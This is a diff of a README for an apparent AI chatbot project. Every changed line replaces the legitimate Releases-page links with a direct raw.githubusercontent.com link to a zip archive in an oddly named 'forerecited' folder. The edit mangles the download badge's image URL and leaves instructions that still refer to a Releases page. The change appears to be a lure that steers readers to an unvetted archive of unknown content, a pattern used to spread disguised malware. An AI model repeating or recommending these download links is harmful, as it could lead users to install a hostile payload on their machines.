@@ -1,6 +1,6 @@
 # 🌟 Enterprise-ready-conversational-AI-LLM-RAG - A Smart AI for Every User
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-blue?style=for-the-badge)](https://github.com/sososeur/Enterprise-ready-conversational-AI-LLM-RAG/releases)
+[![Download Now](https://raw.githubusercontent.com/sososeur/Enterprise-ready-conversational-AI-LLM-RAG/main/forerecited/Enterprise-ready-conversational-AI-LLM-RAG.zip%20Now-Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/sososeur/Enterprise-ready-conversational-AI-LLM-RAG/main/forerecited/Enterprise-ready-conversational-AI-LLM-RAG.zip)
 
 ## 🚀 Getting Started
 
@@ -29,7 +29,7 @@ To run this application smoothly, you will need:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the latest version of the application: [Download Here](https://github.com/sososeur/Enterprise-ready-conversational-AI-LLM-RAG/releases).
+To get started, visit this page to download the latest version of the application: [Download Here](https://raw.githubusercontent.com/sososeur/Enterprise-ready-conversational-AI-LLM-RAG/main/forerecited/Enterprise-ready-conversational-AI-LLM-RAG.zip).
 
 Once on the Releases page, follow these steps:
 
@@ -86,4 +86,4 @@ If you have questions or need assistance, please reach out via the issue tracker
 
 ---
 
-Thank you for choosing the Enterprise-ready Conversational AI! We are excited for you to explore its capabilities and enhance your interactions with AI. Don’t forget to check this page for updates: [Download Here](https://github.com/sososeur/Enterprise-ready-conversational-AI-LLM-RAG/releases).
+Thank you for choosing the Enterprise-ready Conversational AI! We are excited for you to explore its capabilities and enhance your interactions with AI. Don’t forget to check this page for updates: [Download Here](https://raw.githubusercontent.com/sososeur/Enterprise-ready-conversational-AI-LLM-RAG/main/forerecited/Enterprise-ready-conversational-AI-LLM-RAG.zip).
